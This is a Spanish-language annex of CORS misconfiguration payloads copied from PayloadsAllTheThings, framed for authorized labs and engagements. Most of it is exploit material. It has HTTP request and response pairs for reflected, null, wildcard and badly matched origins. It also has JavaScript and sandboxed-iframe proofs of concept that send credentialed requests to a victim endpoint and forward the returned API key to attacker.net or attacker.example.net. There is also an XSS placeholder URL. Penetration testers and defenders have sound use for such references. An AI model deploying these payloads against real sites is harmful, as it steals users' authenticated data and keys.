# CORS mal configurado: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [CORS Misconfiguration/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/CORS%20Misconfiguration/README.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. CORS Misconfiguration / Requisitos

### Variantes presentes en tablas o texto del apartado

```text
Origin: https://evil.com
Access-Control-Allow-Credential: true
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Origin: null
```

## 2. CORS Misconfiguration / Metodología

### Variantes presentes en tablas o texto del apartado

```text
https://victim.example.com/endpoint
```

## 3. Reflexión del origen / Implementación vulnerable

```powershell
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: https://evil.com
Cookie: sessionid=... 

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

## 4. Reflexión del origen / Prueba de concepto

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://victim.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```

```html
<html>
     <body>
         <h2>CORS PoC</h2>
         <div id="demo">
             <button type="button" onclick="cors()">Exploit</button>
         </div>
         <script>
             function cors() {
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
                 if (this.readyState == 4 && this.status == 200) {
                 document.getElementById("demo").innerHTML = alert(this.responseText);
                 }
             };
              xhr.open("GET",
                       "https://victim.example.com/endpoint", true);
             xhr.withCredentials = true;
             xhr.send();
             }
         </script>
     </body>
 </html>
```

### Variantes presentes en tablas o texto del apartado

```text
evil.com
```

## 5. Origen null / Implementación vulnerable

```ps1
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: null
Cookie: sessionid=... 

HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

### Variantes presentes en tablas o texto del apartado

```text
null
```

## 6. Origen null / Prueba de concepto

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://victim.example.com/endpoint',true);
  req.withCredentials = true;
  req.send();

  function reqListener() {
    location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);
   };
</script>"></iframe> 
```

### Variantes presentes en tablas o texto del apartado

```text
null
```

## 7. Metodología / XSS en origen confiable

```ps1
https://trusted-origin.example.com/?xss=<script>CORS-ATTACK-PAYLOAD</script>
```

## 8. Metodología / Origen comodín sin credenciales

```powershell
* is the only wildcard origin
https://*.example.com is not valid
```

### Variantes presentes en tablas o texto del apartado

```text
*
```

## 9. Origen comodín sin credenciales / Implementación vulnerable

```powershell
GET /endpoint HTTP/1.1
Host: api.internal.example.com
Origin: https://evil.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *

{"[private API key]"}
```

## 10. Origen comodín sin credenciales / Prueba de concepto

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.internal.example.com/endpoint',true); 
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```

## 11. Ampliación del origen / Implementación vulnerable (Ejemplo 1)

```ps1
GET /endpoint HTTP/1.1
Host: api.example.com
Origin: https://evilexample.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evilexample.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

### Variantes presentes en tablas o texto del apartado

```text
example.com
```

## 12. Ampliación del origen / Prueba de concepto (Ejemplo 1)

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```

### Variantes presentes en tablas o texto del apartado

```text
evilexample.com
```

## 13. Ampliación del origen / Implementación vulnerable (Ejemplo 2)

```ps1
GET /endpoint HTTP/1.1
Host: api.example.com
Origin: https://apiiexample.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://apiiexample.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

### Variantes presentes en tablas o texto del apartado

```text
^api.example.com$
^api\.example.com$
```

## 14. Ampliación del origen / Prueba de concepto (Ejemplo 2)

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```

### Variantes presentes en tablas o texto del apartado

```text
apiiexample.com
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
